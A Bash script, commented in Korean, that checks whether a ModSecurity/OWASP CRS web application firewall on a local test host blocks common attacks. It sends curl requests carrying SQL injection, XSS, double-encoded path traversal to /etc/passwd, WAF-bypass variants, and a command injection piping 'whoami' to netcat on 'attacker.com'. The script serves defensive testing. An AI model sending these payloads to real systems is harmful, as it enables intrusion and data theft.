#!/bin/bash

# WAF 공격 테스트 스크립트
# ModSecurity + OWASP CRS 동작 확인용

echo "🛡️ WAF 공격 테스트 시작"
echo "대상: http://localhost:8080 (또는 waf-test.local)"

# 기본 설정
TARGET_HOST="${1:-localhost:8080}"
SLEEP_TIME=1

# 색상 설정
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 테스트 결과 로깅
log_test() {
    local test_name="$1"
    local response_code="$2"
    local expected="$3"
    
    if [ "$response_code" = "$expected" ]; then
        echo -e "${GREEN}✅ $test_name: PASS (응답코드: $response_code)${NC}"
    else
        echo -e "${RED}❌ $test_name: FAIL (응답코드: $response_code, 예상: $expected)${NC}"
    fi
}

echo -e "\n${YELLOW}=== 1. 정상 요청 테스트 (통과되어야 함) ===${NC}"

# 정상 헬스체크
echo "헬스체크 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/health")
log_test "헬스체크" "$response" "200"
sleep $SLEEP_TIME

# 정상 API 요청
echo "정상 API 요청..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/api/users")
log_test "정상 API 요청" "$response" "200"
sleep $SLEEP_TIME

# 정상 검색 요청
echo "정상 검색 요청..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/search?q=kubernetes")
log_test "정상 검색" "$response" "200"
sleep $SLEEP_TIME

echo -e "\n${YELLOW}=== 2. SQL Injection 공격 테스트 (차단되어야 함) ===${NC}"

# 기본 SQL Injection
echo "기본 SQL Injection 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?id=1' OR '1'='1")
log_test "기본 SQL Injection" "$response" "403"
sleep $SLEEP_TIME

# UNION 기반 SQL Injection
echo "UNION SQL Injection 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?id=1 UNION SELECT * FROM users")
log_test "UNION SQL Injection" "$response" "403"
sleep $SLEEP_TIME

# Time-based SQL Injection
echo "Time-based SQL Injection 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?id=1; WAITFOR DELAY '00:00:10'--")
log_test "Time-based SQL Injection" "$response" "403"
sleep $SLEEP_TIME

# Boolean-based SQL Injection
echo "Boolean-based SQL Injection 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?user=admin' AND '1'='1'--")
log_test "Boolean SQL Injection" "$response" "403"
sleep $SLEEP_TIME

echo -e "\n${YELLOW}=== 3. XSS (Cross-Site Scripting) 공격 테스트 ===${NC}"

# 기본 XSS
echo "기본 XSS 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?q=<script>alert(1)</script>")
log_test "기본 XSS" "$response" "403"
sleep $SLEEP_TIME

# Event handler XSS
echo "Event handler XSS 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?q=<img src=x onerror=alert(1)>")
log_test "Event handler XSS" "$response" "403"
sleep $SLEEP_TIME

# JavaScript protocol XSS
echo "JavaScript protocol XSS 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?url=javascript:alert(1)")
log_test "JavaScript protocol XSS" "$response" "403"
sleep $SLEEP_TIME

echo -e "\n${YELLOW}=== 4. Path Traversal 공격 테스트 ===${NC}"

# 기본 Path Traversal
echo "기본 Path Traversal 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?file=../../../etc/passwd")
log_test "기본 Path Traversal" "$response" "403"
sleep $SLEEP_TIME

# URL 인코딩된 Path Traversal
echo "URL 인코딩 Path Traversal 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?file=..%2F..%2F..%2Fetc%2Fpasswd")
log_test "URL 인코딩 Path Traversal" "$response" "403"
sleep $SLEEP_TIME

# 이중 인코딩 Path Traversal
echo "이중 인코딩 Path Traversal 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd")
log_test "이중 인코딩 Path Traversal" "$response" "403"
sleep $SLEEP_TIME

echo -e "\n${YELLOW}=== 5. Command Injection 공격 테스트 ===${NC}"

# 기본 Command Injection
echo "기본 Command Injection 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?cmd=ls; cat /etc/passwd")
log_test "기본 Command Injection" "$response" "403"
sleep $SLEEP_TIME

# 파이프를 통한 Command Injection
echo "파이프 Command Injection 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?cmd=whoami | nc attacker.com 4444")
log_test "파이프 Command Injection" "$response" "403"
sleep $SLEEP_TIME

echo -e "\n${YELLOW}=== 6. HTTP Header 공격 테스트 ===${NC}"

# Host Header Injection
echo "Host Header Injection 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: evil.com" "http://$TARGET_HOST/")
log_test "Host Header Injection" "$response" "403"
sleep $SLEEP_TIME

# User-Agent 기반 공격
echo "악성 User-Agent 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: <script>alert(1)</script>" "http://$TARGET_HOST/")
log_test "악성 User-Agent" "$response" "403"
sleep $SLEEP_TIME

echo -e "\n${YELLOW}=== 7. 대용량 요청 공격 테스트 ===${NC}"

# 대용량 POST 데이터
echo "대용량 POST 데이터 테스트..."
large_data=$(printf 'A%.0s' {1..100000})  # 100KB 데이터
response=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "$large_data" "http://$TARGET_HOST/")
log_test "대용량 POST 데이터" "$response" "413"
sleep $SLEEP_TIME

echo -e "\n${YELLOW}=== 8. 다중 공격 벡터 테스트 ===${NC}"

# SQL Injection + XSS 조합
echo "SQL Injection + XSS 조합 테스트..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?id=1' OR '1'='1'&xss=<script>alert(1)</script>")
log_test "SQL Injection + XSS" "$response" "403"
sleep $SLEEP_TIME

echo -e "\n${YELLOW}=== 9. 우회 시도 테스트 ===${NC}"

# 대소문자 변경을 통한 우회 시도
echo "대소문자 우회 시도..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?q=<ScRiPt>alert(1)</ScRiPt>")
log_test "대소문자 우회" "$response" "403"
sleep $SLEEP_TIME

# 주석을 통한 SQL Injection 우회 시도
echo "주석 우회 시도..."
response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_HOST/?id=1'/**/OR/**/'1'='1")
log_test "주석 우회" "$response" "403"
sleep $SLEEP_TIME

echo -e "\n${GREEN}=== WAF 테스트 완료 ===${NC}"
echo -e "📊 ${YELLOW}상세한 로그는 다음 명령어로 확인 가능:${NC}"
echo "kubectl logs -f deployment/nginx-ingress-modsecurity -n waf-system"
echo ""
echo -e "📈 ${YELLOW}WAF 통계 확인:${NC}"
echo "curl http://$TARGET_HOST/waf/status"